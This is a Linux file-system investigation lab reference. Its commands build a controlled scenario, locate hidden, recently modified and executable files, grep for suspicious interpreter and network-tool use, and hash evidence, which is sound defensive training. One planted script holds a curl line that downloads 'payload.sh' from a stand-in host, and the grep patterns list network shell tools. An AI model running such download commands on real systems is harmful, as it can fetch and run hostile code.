# Linux File System Investigation — Selected Commands

This concise reference contains the commands that best represent the Lab 03 investigation. No discovered or untrusted script should be executed. Every terminal command is displayed on one line.

## Build the Controlled Scenario

Creates the investigation directories:

```bash
mkdir -p suspicious-app/config suspicious-app/logs suspicious-app/scripts evidence
```

Creates the hidden training file:

```bash
printf '%s\n' 'temporary_token=TrainingTokenOnly' > suspicious-app/.app-cache
```

Creates the legitimate maintenance script and applies mode `750`:

```bash
printf '#!/usr/bin/env bash\necho "Running maintenance"\n' > suspicious-app/scripts/maintenance.sh && chmod 750 suspicious-app/scripts/maintenance.sh
```

Creates the non-executable update script with a controlled remote-download command:

```bash
printf '#!/usr/bin/env bash\ncurl http://192.168.50.1/payload.sh -o /tmp/payload.sh\n' > suspicious-app/scripts/update-check.sh
```

Sets the update script's modification time to 20 minutes ago:

```bash
touch -d "20 minutes ago" suspicious-app/scripts/update-check.sh
```

## Investigate Files and Metadata

Finds hidden regular files:

```bash
find suspicious-app -type f -name ".*"
```

Finds files modified within the previous 30 minutes:

```bash
find suspicious-app -type f -mmin -30
```

Finds executable regular files:

```bash
find suspicious-app -type f -executable
```

Displays metadata for the controlled update script:

```bash
stat suspicious-app/scripts/update-check.sh
```

Identifies the content types of the controlled files:

```bash
file suspicious-app/config/application.conf suspicious-app/scripts/maintenance.sh suspicious-app/scripts/update-check.sh
```

## Search and Review Content Safely

Searches recursively for potentially suspicious commands and interpreters:

```bash
grep -RniE "curl|wget|nc|ncat|bash -c|python" suspicious-app
```

Uses a behavior-focused expression to reduce irrelevant matches:

```bash
grep -RniE "(curl|wget).*(http|https)|bash -c|nc -|python.*socket" suspicious-app
```

Displays the controlled update script as text without executing it:

```bash
cat suspicious-app/scripts/update-check.sh
```

## Hash and Verify Evidence

Hashes every file in the controlled scenario:

```bash
find suspicious-app -type f -exec sha256sum {} \; | sort > evidence/file-hashes.txt
```

Collects recent files under `/tmp` without executing them:

```bash
sudo find /tmp -type f -mmin -60 -ls > evidence/tmp-recent-files.txt
```

Verifies the final evidence checksum manifest:

```bash
cd evidence && sha256sum -c evidence-checksums.sha256
```
